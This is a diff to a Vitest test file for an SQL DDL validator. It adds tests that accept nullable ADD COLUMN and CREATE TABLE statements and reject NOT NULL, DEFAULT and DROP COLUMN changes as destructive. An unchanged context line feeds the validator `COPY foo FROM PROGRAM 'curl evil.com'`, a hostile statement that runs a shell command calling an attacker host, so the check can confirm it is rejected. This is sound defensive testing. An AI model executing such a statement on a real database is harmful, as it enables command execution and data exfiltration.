@@ -11,6 +11,7 @@
 import type { SchemaPlan } from "@nlqdb/db/types";
 import { describe, expect, it } from "vitest";
 import { compileDdl } from "../db-create/compile-ddl.ts";
+import { compileWriteDdl } from "../db-create/compile-write-ddl.ts";
 import { validateCompiledDdl } from "./sql-validate-ddl.ts";
 
 describe("validateCompiledDdl", () => {
@@ -152,5 +153,62 @@ describe("validateCompiledDdl", () => {
     const result = validateCompiledDdl([`COPY foo FROM PROGRAM 'curl evil.com';`]);
     expect(result.ok).toBe(false);
     if (!result.ok) expect(result.reason).toBe("side_effect_function");
+  });
+
+  // GLOBAL-041 Phase A step 4 — the allow-list accepts exactly what the
+  // widen-on-write compiler (compile-write-ddl.ts) emits: a nullable
+  // ADD COLUMN and a widen-path CREATE TABLE. NOT NULL / DEFAULT adds and
+  // every non-widen ALTER subtype stay in the destructive bucket.
+  it("accepts the output of a real compileWriteDdl run (ADD COLUMN + CREATE TABLE)", () => {
+    const compiled = compileWriteDdl(
+      {
+        create_tables: [
+          {
+            name: "events",
+            description: "t",
+            columns: [
+              { name: "id", type: "uuid", nullable: false, description: "pk" },
+              { name: "note", type: "text", nullable: true, description: "c" },
+            ],
+            primary_key: ["id"],
+          },
+        ],
+        add_columns: [
+          {
+            table: "orders",
+            column: { name: "coupon", type: "text", nullable: true, description: "c" },
+          },
+        ],
+      },
+      "tenant_schema",
+    );
+    if (!compiled.ok) throw new Error(`compile failed: ${compiled.reason}`);
+    expect(validateCompiledDdl(compiled.statements)).toEqual({ ok: true });
+  });
+
+  it("accepts a plain nullable ADD COLUMN", () => {
+    expect(validateCompiledDdl([`ALTER TABLE "s"."orders" ADD COLUMN "coupon" TEXT;`])).toEqual({
+      ok: true,
+    });
+  });
+
+  it("rejects an ADD COLUMN with NOT NULL as destructive_verb", () => {
+    const result = validateCompiledDdl([`ALTER TABLE "s"."orders" ADD COLUMN "x" TEXT NOT NULL;`]);
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe("destructive_verb");
+  });
+
+  it("rejects an ADD COLUMN with a DEFAULT as destructive_verb", () => {
+    const result = validateCompiledDdl([
+      `ALTER TABLE "s"."orders" ADD COLUMN "x" TEXT DEFAULT 'y';`,
+    ]);
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe("destructive_verb");
+  });
+
+  it("rejects ALTER TABLE DROP COLUMN as destructive_verb", () => {
+    const result = validateCompiledDdl([`ALTER TABLE "s"."orders" DROP COLUMN "total";`]);
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe("destructive_verb");
   });
 });
